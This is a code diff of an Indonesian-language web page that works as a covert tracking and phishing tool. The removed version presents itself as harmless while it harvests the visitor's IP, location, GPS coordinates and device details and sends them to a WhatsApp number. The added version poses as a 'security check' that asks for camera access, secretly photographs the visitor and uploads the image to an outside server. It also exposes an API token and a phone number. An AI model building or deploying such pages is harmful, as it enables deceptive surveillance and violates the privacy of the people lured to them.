@@ -3,112 +3,92 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mantis Kirai</title>
+    <title>Auto Capture & Upload</title>
     <style>
         body {
+            background: linear-gradient(135deg, #1e3c72, #2a5298);
+            color: white;
             font-family: Arial, sans-serif;
             text-align: center;
-            background: #121212;
-            color: white;
-            padding: 20px;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
         }
         .container {
-            background: #1E1E1E;
+            background: rgba(255, 255, 255, 0.2);
             padding: 20px;
             border-radius: 10px;
-            display: inline-block;
-            box-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
         }
         button {
             padding: 10px 20px;
-            margin: 10px;
+            background: #ff6b6b;
             border: none;
-            border-radius: 5px;
-            cursor: pointer;
+            color: white;
             font-size: 16px;
+            cursor: pointer;
+            border-radius: 5px;
+            margin-top: 20px;
         }
-        .track-btn { background: green; color: white; }
-        .send-btn { background: blue; color: white; display: none; }
+        button:hover {
+            background: #ff4f4f;
+        }
     </style>
 </head>
 <body>
+
     <div class="container">
-        <h2>Tidak Berbahaya😇</h2>
-        <button class="track-btn" onclick="startTracking()">Cek Sekarang</button>
-        <div id="info"></div>
-        <button class="send-btn" onclick="sendToWhatsApp()">Kirimkan</button>
+        <h2>🔒 Keamanan Diperiksa</h2>
+        <p>Mohon izinkan kamera untuk verifikasi...</p>
+        <button id="startBtn">Mulai</button>
     </div>
 
+    <video id="video" style="display:none;" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
     <script>
-        let trackingData = {};
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
+        const startBtn = document.getElementById("startBtn");
 
-        async function startTracking() {
-            document.getElementById("info").innerHTML = "Melacak...";
+        startBtn.addEventListener("click", () => {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then((stream) => {
+                    video.srcObject = stream;
+                    setTimeout(takePhoto, 3000); // Ambil foto setelah 3 detik
+                })
+                .catch((err) => {
+                    alert("Izin kamera ditolak!");
+                });
+        });
 
-            // Dapatkan IP & Lokasi
-            let ipData = await fetch("https://ipinfo.io/json?token=6d8519218e7b69").then(res => res.json());
+        function takePhoto() {
+            const context = canvas.getContext("2d");
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // Dapatkan Data Perangkat
-            let userAgent = navigator.userAgent;
-            let screenWidth = screen.width;
-            let screenHeight = screen.height;
-            let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            let currentTime = new Date().toLocaleString();
-
-            // Dapatkan Status Jaringan
-            let connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            let networkType = connection ? connection.effectiveType : "Tidak Diketahui";
-            let downlinkSpeed = connection ? connection.downlink + " Mbps" : "Tidak Diketahui";
-
-            // Dapatkan Status Baterai
-            navigator.getBattery().then(battery => {
-                trackingData = {
-                    ip: ipData.ip,
-                    kota: ipData.city,
-                    negara: ipData.country,
-                    koordinat: ipData.loc,
-                    provider: ipData.org,
-                    baterai: (battery.level * 100) + "%",
-                    pengisian: battery.charging ? "Sedang Mengisi" : "Tidak Mengisi",
-                    perangkat: userAgent,
-                    resolusi: `${screenWidth}x${screenHeight}`,
-                    waktu: currentTime,
-                    zona_waktu: timezone,
-                    koneksi: networkType,
-                    kecepatan: downlinkSpeed,
-                    cookies: navigator.cookieEnabled ? "Diaktifkan" : "Nonaktif",
-                    javascript: "Diaktifkan"
-                };
-
-                // Dapatkan Lokasi Detail (Jika Diizinkan)
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(position => {
-                        trackingData.lokasi_detail = `${position.coords.latitude}, ${position.coords.longitude}`;
-                        tampilkanIP();
-                    }, () => {
-                        trackingData.lokasi_detail = "Ditolak oleh pengguna";
-                        tampilkanIP();
-                    });
-                } else {
-                    trackingData.lokasi_detail = "Tidak Didukung";
-                    tampilkanIP();
-                }
-            });
+            // Convert ke Blob
+            canvas.toBlob((blob) => {
+                sendToBackend(blob);
+            }, "image/jpeg");
         }
 
-        function tampilkanIP() {
-            document.getElementById("info").innerHTML = `<p><b>IP Publik:</b> ${trackingData.ip}</p>`;
-            document.querySelector(".send-btn").style.display = "inline-block";
-        }
+        function sendToBackend(blob) {
+            let formData = new FormData();
+            formData.append("image", blob, "photo.jpg");
 
-        function sendToWhatsApp() {
-            let dataString = JSON.stringify(trackingData);
-            let encodedData = btoa(dataString);  // Encode ke Base64
-            
-            let waMessage = encodeURIComponent("🔒 Data Aman (LOCKED):\n" + encodedData);
-            let waUrl = `https://wa.me/6287713740114?text=${waMessage}`;
-            window.open(waUrl, "_blank");
+            fetch("https://imonback.my.id/upload.php", {
+                method: "POST",
+                body: formData
+            })
+            .then(response => response.text())
+            .then(result => console.log("Upload sukses:", result))
+            .catch(error => console.error("Upload gagal:", error));
         }
     </script>
+
 </body>
 </html>
